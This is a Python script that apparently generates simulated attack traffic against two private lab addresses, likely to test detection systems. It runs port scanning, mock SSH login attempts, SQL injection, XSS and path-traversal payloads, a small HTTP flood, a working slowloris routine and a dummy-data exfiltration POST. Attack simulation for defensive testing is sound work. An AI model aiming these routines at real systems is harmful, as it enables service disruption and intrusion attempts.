#!/usr/bin/env python3
import time
import socket
import logging
import urllib.request
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import threading

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

SERVERS = ["192.168.30.10", "192.168.30.11"]
PORTS_TO_SCAN = [21, 22, 23, 80, 443, 445, 8080, 3306]

def port_scan(target_ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2)
        s.connect_ex((target_ip, port))
        s.close()
    except Exception:
        pass

def simulate_ssh_bruteforce(target_ip):
    usernames = [b"root", b"admin", b"sysadmin"]
    for user in usernames:
        for _ in range(3):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((target_ip, 22))
                s.recv(1024)
                s.sendall(b"SSH-2.0-OpenSSH_8.2p1\r\n")
                time.sleep(0.1)
                s.sendall(b"fake_auth_" + user + b"_pwd\n")
                s.close()
            except Exception:
                pass

def simulate_web_attacks(target_ip):
    payloads = [
        "1' OR '1'='1",
        "admin' --",
        "<script>alert(1)</script>",
        "../../../etc/passwd"
    ]
    for payload in payloads:
        try:
            encoded_payload = urllib.parse.quote(payload)
            url = f"http://{target_ip}/login?user={encoded_payload}"
            req = urllib.request.Request(url, headers={'User-Agent': 'SQLMap/1.4'})
            urllib.request.urlopen(req, timeout=1)
        except Exception:
            pass

def simulate_ddos(target_ip):
    def http_flood():
        for _ in range(20):
            try:
                urllib.request.urlopen(f"http://{target_ip}/", timeout=0.5)
            except Exception:
                pass
    threads = []
    for _ in range(10):
        t = threading.Thread(target=http_flood)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def simulate_slowloris(target_ip):
    sockets = []
    try:
        for _ in range(20):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, 80))
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n")
            sockets.append(s)
            
        for _ in range(5):
            for s in sockets:
                try:
                    s.sendall(b"X-a: b\r\n")
                except Exception:
                    pass
            time.sleep(1)
    except Exception:
        pass
    finally:
        for s in sockets:
            s.close()

def simulate_data_exfiltration(target_ip):
    try:
        url = f"http://{target_ip}/upload"
        data = b"A" * (1024 * 1024 * 5)
        req = urllib.request.Request(url, data=data, method='POST')
        urllib.request.urlopen(req, timeout=2)
    except Exception:
        pass

def main():
    logging.info("Starting ADVANCED SIMULATED ATTACK (0-days, DoS, Exfiltration)...")
    
    logging.info("Phase 1: Port Scan...")
    with ThreadPoolExecutor(max_workers=20) as executor:
        for server in SERVERS:
            for port in PORTS_TO_SCAN:
                executor.submit(port_scan, server, port)
                
    time.sleep(1)
    
    logging.info("Phase 2: SSH Brute-Force...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        for server in SERVERS:
            executor.submit(simulate_ssh_bruteforce, server)
            
    time.sleep(1)
            
    logging.info("Phase 3: Layer 7 Web Attacks (SQLi & XSS)...")
    with ThreadPoolExecutor(max_workers=5) as executor:
        for server in SERVERS:
            executor.submit(simulate_web_attacks, server)
            
    time.sleep(1)
            
    logging.info("Phase 4: HTTP DDoS Flood...")
    for server in SERVERS:
        simulate_ddos(server)
        
    time.sleep(1)
        
    logging.info("Phase 5: Slowloris (Low & Slow DoS)...")
    for server in SERVERS:
        simulate_slowloris(server)
        
    time.sleep(1)
        
    logging.info("Phase 6: Data Exfiltration (Massive POST)...")
    for server in SERVERS:
        simulate_data_exfiltration(server)
            
    logging.info("Advanced attack completed.")

if __name__ == "__main__":
    main()
